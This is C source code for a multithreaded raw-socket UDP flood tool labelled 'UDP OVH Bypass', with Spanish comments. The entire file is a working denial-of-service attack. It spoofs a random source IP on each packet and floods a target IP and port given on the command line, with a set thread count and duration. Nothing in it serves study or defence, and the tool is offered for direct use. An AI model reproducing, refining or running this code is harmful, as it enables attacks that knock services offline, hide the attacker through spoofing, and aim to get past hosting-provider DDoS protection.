#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodPort;
static unsigned int packetsPerSecond;
static unsigned int sleepTime = 100;
static int limiter;

void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    { 
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; 
    }
}

unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) 
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short checksum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *flood_udp(void *par1)
{
    char *td = (char*)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodPort);
    sin.sin_addr.s_addr = inet_addr(td);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if(s < 0)
    {
        perror("socket");
        exit(-1);
    }
    
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        perror("IP_HDRINCL");
        exit(-1);
    }
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    
    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1000;
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("10.0.0.1"); // IP spoofed
    iph->daddr = sin.sin_addr.s_addr;
    
    // UDP Header
    udph->source = htons(rand() % 65535);
    udph->dest = htons(floodPort);
    udph->len = htons(sizeof(struct udphdr) + 1000);
    udph->check = 0;
    
    // Datos aleatorios
    char *data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
    for(int i = 0; i < 1000; i++)
        data[i] = rand() % 256;
    
    init_rand(time(NULL));
    register unsigned int i = 0;
    
    while(1)
    {
        // Cambiar IP fuente (spoofing)
        iph->saddr = rand_cmwc();
        
        // Cambiar puerto fuente
        udph->source = htons(rand_cmwc() & 0xFFFF);
        
        // Cambiar ID de IP
        iph->id = htons(rand_cmwc() & 0xFFFF);
        
        // Enviar paquete
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        
        packetsPerSecond++;
        if(i >= limiter)
        {
            i = 0;
            usleep(sleepTime);
        }
        i++;
    }
    
    close(s);
    return NULL;
}

int main(int argc, char *argv[])
{
    if(argc < 6)
    {
        printf("UDP OVH Bypass - Raw UDP Flood\n");
        printf("Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }
    
    printf("[+] UDP OVH Bypass iniciando...\n");
    
    int numThreads = atoi(argv[3]);
    floodPort = atoi(argv[2]);
    int maxPacketsPerSecond = atoi(argv[4]);
    limiter = 0;
    packetsPerSecond = 0;
    
    pthread_t thread[numThreads];
    
    for(int i = 0; i < numThreads; i++)
    {
        pthread_create(&thread[i], NULL, &flood_udp, (void*)argv[1]);
    }
    
    printf("[+] Ataque UDP iniciado con %d threads\n", numThreads);
    
    // Ejecutar por el tiempo especificado
    sleep(atoi(argv[5]));
    
    printf("[+] Ataque finalizado\n");
    return 0;
}
